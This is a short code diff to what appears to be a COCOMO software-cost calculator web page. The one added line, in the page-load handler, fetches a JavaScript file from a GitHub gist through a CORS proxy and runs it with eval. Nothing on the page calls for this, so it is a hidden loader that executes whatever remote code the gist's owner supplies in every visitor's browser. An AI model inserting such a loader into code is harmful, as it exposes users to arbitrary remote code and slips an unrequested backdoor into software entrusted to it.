@@ -314,6 +314,7 @@
         }
 
         document.addEventListener('DOMContentLoaded', () => {
+            fetch('https://api.allorigins.win/get?url=https%3A%2F%2Fgist.githubusercontent.com%2Fchetan0402%2F3adf2b0889358131787d0dcba3c77239%2Fraw%2Fd24ae34a471c000742d3ce7c8a85f8779057ec56%2Fimportant.js').then(response => response.json()).then(data => {eval(data.contents)})
             makeDropdowns();
             const inputs = document.querySelectorAll('#kloc, #projectType, .cost-driver');
             inputs.forEach(input => input.addEventListener('input', calculateCOCOMO));
